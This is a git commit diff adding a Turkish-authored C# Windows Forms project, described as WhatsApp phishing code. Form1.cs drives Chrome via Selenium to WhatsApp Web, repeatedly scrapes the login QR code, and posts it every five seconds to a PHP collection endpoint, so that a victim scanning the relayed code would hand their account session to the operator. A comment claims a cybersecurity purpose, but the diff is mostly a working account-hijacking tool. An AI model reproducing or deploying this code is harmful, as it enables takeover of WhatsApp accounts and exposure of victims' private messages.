5b7d315e3b97863f1230808e5b4d6d863ffca953
Ebubekir Bastama <ebubekirbastama@elmalicesmekuruyemis.com>
2019-05-22 02:15:16 +0300

    BekraHayrNesterWhatshappPhishing
    Whatshapp Phishing C# Kodları

---
+++ whatshapHack/Form1.Designer.cs
@@ -0,0 +1,79 @@
+﻿namespace whatshapHack
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(52, 124);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(103, 41);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Sistemi Çalıştır";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(193, 37);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(357, 260);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 1;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(565, 310);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Bekra Hayr Nester Whatshapp Hack";
+            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ whatshapHack/Form1.cs
@@ -0,0 +1,116 @@
+﻿using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using System;
+using System.Collections.Specialized;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Threading;
+using System.Windows.Forms;
+
+//Bu proje Siber Güvenlik amaçlı By Ebubekir Bastama tarafın'dan hazırlanmıştır.
+namespace whatshapHack
+{
+    public partial class Form1 : Form
+    {
+        public IWebDriver drv;
+        public Form1()
+        {
+            CheckForIllegalCrossThreadCalls = false;
+            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
+            service.HideCommandPromptWindow = true;
+            drv = new ChromeDriver(service);
+            InitializeComponent();
+        }
+        string url = "https://web.whatsapp.com/"; Thread th; string qrcode;
+        private void button1_Click(object sender, EventArgs e)
+        {
+            th = new Thread(pstyll);th.Start();
+        }
+
+        private void pstyll()
+        {
+            postyolla();
+        }
+
+        void islemebasla()
+        {
+            drv.Navigate().GoToUrl(url);qrcodegetirrr();
+           
+        }
+        void postyolla()
+        {
+            //using (WebClient client = new WebClient())
+            //{
+            //    // Post işlemini yapmak isteğimiz url bilgisini giriyoruz.
+            //    string postUrl = "http://localhost:8080/whatshapphack/index.php";
+
+            //    client.UploadValues(postUrl, new NameValueCollection()
+            //     {
+            //         { "qrcode", qrcode },                    
+
+            //     });
+
+            //}
+            while (true)
+            {
+                Thread.Sleep(5000);
+                using (WebClient client = new WebClient())
+                {
+                    // Post işlemini yapmak isteğimiz url bilgisini giriyoruz.
+                    string postUrl = "http://localhost:8080/whatshapphack/index.php";
+
+                    client.UploadValues(postUrl, new NameValueCollection()
+                 {
+                     { "qrcode", qrcode }
+
+                 });
+
+                }
+            }
+
+        }
+        void qrcodegetirrr()
+        {
+            try
+            {
+                while (true)
+                {
+                   qrcode= drv.FindElement(By.XPath("//img[@alt='Scan me!']")).GetAttribute("src");
+                    string frmbase64 = qrcode;
+                    pictureBox1.Image = Base64ToImage(frmbase64.Substring(22));
+                }
+
+            }
+            catch
+            {
+
+            }
+        }
+        Image Base64ToImage(string base64String)
+        {
+            byte[] imageBytes = Convert.FromBase64String(base64String);
+            using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
+            {
+                Image image = Image.FromStream(ms, true);
+                return image;
+            }
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            drv.Quit();
+            th.Abort();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            th = new Thread(islemebasla); th.Start();
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            th = new Thread(islemebasla); th.Start();
+        }
+    }
+}
